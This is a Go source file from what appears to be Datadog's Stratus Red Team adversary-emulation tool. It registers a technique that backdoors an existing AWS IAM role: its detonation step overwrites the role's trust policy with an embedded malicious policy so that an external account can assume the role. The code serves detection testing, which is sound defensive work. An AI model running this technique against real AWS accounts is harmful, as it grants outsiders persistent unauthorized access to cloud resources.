package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

//go:embed malicious_policy.json
var maliciousIamPolicy string

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.backdoor-iam-role",
		FriendlyName: "Backdoor an existing IAM Role",
		Description: `
Establishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.

Warm-up: Creates the pre-requisite IAM role.

Detonation: Updates the assume role policy of the IAM role to backdoor it.
`,
		Platform:                   stratus.AWS,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate: func(params map[string]string) error {
			iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
			roleName := params["role_name"]
			log.Println("Backdooring IAM role " + roleName + " by allowing sts:AssumeRole from an external AWS account")
			_, err := iamClient.UpdateAssumeRolePolicy(context.Background(), &iam.UpdateAssumeRolePolicyInput{
				RoleName:       aws.String(roleName),
				PolicyDocument: aws.String(maliciousIamPolicy),
			})
			if err != nil {
				return errors.New("unable to backdoor IAM role: " + err.Error())
			}
			return nil
		},
	})
}
